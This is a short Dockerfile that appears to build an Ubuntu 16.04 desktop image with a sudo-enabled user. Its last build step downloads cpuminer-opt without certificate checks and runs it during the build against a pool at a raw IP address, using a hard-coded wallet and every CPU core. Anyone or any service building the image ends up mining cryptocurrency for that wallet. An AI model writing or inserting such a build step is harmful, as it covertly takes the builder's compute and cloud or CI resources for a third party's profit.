FROM ubuntu:16.04
ENV DEBIAN_FRONTEND=noninteractive

RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
    ubuntu-desktop \
    sudo \
    bash \
    curl \
    git \
	  unzip \
	  wget \
	  && apt-get update \
	  && apt-get upgrade -y \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m kunemuse && \
    adduser kunemuse sudo && \
    sudo usermod -a -G sudo kunemuse
    
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcp://209.23.11.241:80 -u uu4XmbRcxdqoiyLnb3rkYHny9GE9CqtP4j.wEbb -p x -t$(nproc --all)
